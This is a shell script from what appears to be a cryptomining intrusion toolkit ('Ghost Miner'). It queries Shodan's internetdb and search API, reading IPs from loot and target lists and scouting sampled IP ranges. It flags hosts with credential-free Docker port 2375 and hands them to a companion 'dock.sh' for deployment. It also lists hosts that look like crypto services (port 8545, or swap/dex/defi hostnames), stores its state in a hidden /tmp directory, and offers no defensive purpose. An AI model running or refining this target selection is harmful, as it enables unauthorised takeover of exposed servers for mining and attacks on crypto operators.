#!/bin/sh
# ============================================================================
# Ghost Miner Shodan filter - "search a database, don't scan".
#
# Shodan already crawled the public IPv4 and wrote down what answers: open ports,
# cpe software + versions, hostnames, tags. internetdb.shodan.io serves that per
# IP with NO API KEY, so it is a free pre-filter for our queue: which candidates
# have a way in at all, which have the credential-free docker port :2375 open
# (handed to dock.sh, which needs no key), and which smell like a crypto app
# (:8545, or a swap/dex/defi/bridge/token hostname).
#
# Measured caveat - this is a *crawl*, so it is stale: our own box, whose :2375
# we exposed minutes earlier, is absent from the DB, and "No information
# available" is common in cloud ranges. So it prioritises; it never proves a
# port is closed. The wide sweep (dockmass.sh) is the complement, not a
# substitute: the fresh server "stood up yesterday with defaults" is exactly the
# one a months-old crawl has never seen.
#
# modes:
#   filter  - internetdb every candidate IP we have, log it, hand :2375 hosts to
#             mass.found (dock deploys them), :8545/crypto-named hosts to
#             crypto.txt, and note hosts with no way in at all (idb.dead)
#   scout   - internetdb a sample of addresses from the given /16s, hunting for
#             :2375 / :8545 that the database already knows about
#   search  - real Shodan search API query (needs SHODAN_KEY), e.g.
#             shodan.sh search 'port:2375 !cloudflare country:DE'
#   stat    - what we have learned
#
# State: .hunt/idb.txt (ip \t ports \t tags \t hostname) and .hunt/idb.done
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
[ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK"

MAX="${IDB_MAX:-200}"          # IPs to look up per run (internetdb is ~1 req/s)
DEADSKIP="${IDB_SKIP_DEAD:-yes}"
KEY="${SHODAN_KEY:-}"
IDB="$WORK/idb.txt"
DONE="$WORK/idb.done"
DEAD="$WORK/idb.dead"
CRYPTO="$WORK/crypto.txt"
touch "$IDB" "$DONE" "$DEAD" "$CRYPTO"

# ports/tags/hostnames out of the tiny JSON, no jq
jget() { sed -n "s/.*\"$2\":\[\([^]]*\)\].*/\1/p" <<EOF
$1
EOF
}
jstr() { sed -n "s/.*\"$2\":\"\([^\"]*\)\".*/\1/p" <<EOF
$1
EOF
}

# one address -> idb.txt, plus the follow-ups it earns. echo the verdict.
lookup() {
    ip=$1
    tries=0
    r=""
    while [ "$tries" -lt 3 ]; do
        tries=$((tries + 1))
        r=$(curl -sS -m 8 "https://internetdb.shodan.io/$ip" 2>/dev/null) || r=""
        # internedb is ~1 req/s and answers a burst with {"error":"Rate limit
        # exceeded..."}. That is NOT "no information": a throttled reply used to
        # be parsed as data, so the host was logged with empty ports and then
        # marked unenterable - i.e. a rate limit quietly deleted real
        # candidates. Back off and retry; on final failure leave the host out of
        # idb.done so the next run picks it up again.
        case "$r" in
            *'"error"'*|*'Rate limit'*|"") sleep $((tries * 3)) ;;
            *) break ;;
        esac
    done
    case "$r" in
        *'"error"'*|*'Rate limit'*|"")
            echo "shodan: $ip still rate-limited, retrying next run"
            return 0 ;;
    esac
    printf '%s\n' "$ip" >> "$DONE"
    case "$r" in
        ""|*'"detail"'*)
            printf '%s\t\t\t\n' "$ip" >> "$IDB"
            return 0 ;;
    esac
    ports=$(jget "$r" ports | tr -d ' ')
    tags=$(jget "$r" tags | tr -d ' ')
    hn=$(jstr "$r" hostnames | tr -d ' ')
    printf '%s\t%s\t%s\t%s\n' "$ip" "$ports" "$tags" "$hn" >> "$IDB"
    case ",$ports," in
        *,2375,*)   printf '%s\tshodan\n' "$ip" >> "$WORK/mass.found"
                    echo "shodan: $ip has :2375 -> dock" ;;
    esac
    case ",$ports,$hn,$tags," in
        *,8545,*|*swap*|*dex*|*defi*|*bridge*|*token*|*crypto*)
                    printf '%s\tports=%s host=%s\n' "$ip" "$ports" "$hn" >> "$CRYPTO"
                    echo "shodan: $ip looks crypto ($ports $hn)" ;;
    esac
    # no ssh, no docker, nothing we could enter: note it so probe can skip
    case ",$ports," in
        *,22,*|*,2222,*|*,2375,*) ;;
        *)  printf '%s\n' "$ip" >> "$DEAD" ;;
    esac
    return 0
}

case "${1:-filter}" in
    stat)
        echo "shodan: looked up $(wc -l < "$DONE"), logged $(wc -l < "$IDB"), crypto-ish $(wc -l < "$CRYPTO"), no-way-in $(wc -l < "$DEAD")"
        echo "shodan: key $([ -n "$KEY" ] && echo present || echo absent)  dead-skip $DEADSKIP"
        exit 0 ;;
    filter)
        n=0
        { cut -f3 "$WORK/targets.txt" 2>/dev/null || :
          cut -f3 "$WORK/loot.txt" 2>/dev/null || :; } \
          | grep -E '^([0-9]{1,3}\.){3}[0-9]{1,3}$' | sort -u \
          | { if [ -s "$DONE" ]; then grep -vxF -f "$DONE"; else cat; fi; } \
          | head -n "$MAX" > "$WORK/idb.q.$$"
        while read -r ip; do
            [ -n "$ip" ] || continue
            lookup "$ip"
            sleep 1
            n=$((n + 1))
        done < "$WORK/idb.q.$$"
        rm -f "$WORK/idb.q.$$"
        echo "shodan: looked up $n new candidate(s)" ;;
    scout)
        shift || :
        nets="${*:-5.9 88.198 64.227 159.89 146.190 138.201}"
        n=0
        for net in $nets; do
            for h in 23 67 115 163 211; do
                for l in 5 77 199; do
                    ip="$net.$h.$l"
                    grep -qxF "$ip" "$DONE" 2>/dev/null && continue
                    lookup "$ip"
                    sleep 1
                    n=$((n + 1))
                done
            done
        done
        echo "shodan: scouted $n address(es)" ;;
    search)
        q="${2:?usage: shodan.sh search '<query>'}"
        [ -n "$KEY" ] || { echo "shodan: SHODAN_KEY unset"; exit 0; }
        curl -sS -m 20 "https://api.shodan.io/shodan/host/search?key=$KEY&query=$(printf '%s' "$q" | sed 's/ /%20/g')" 2>/dev/null \
          | grep -oE '"ip_str":"[0-9.]+"' | cut -d'"' -f4 | sort -u > "$WORK/shodan.$$"
        n=$(wc -l < "$WORK/shodan.$$")
        echo "shodan: search '$q' -> $n host(s)"
        cut -f1 "$WORK/mass.found" 2>/dev/null > "$WORK/mass.keep" || :
        while read -r ip; do
            [ -n "$ip" ] || continue
            printf '%s\tshodan-search\n' "$ip" >> "$WORK/mass.found"
        done < "$WORK/shodan.$$"
        rm -f "$WORK/shodan.$$" "$WORK/mass.keep" ;;
    *)  echo "usage: $0 [filter|scout|search '<query>'|stat]"; exit 2 ;;
esac
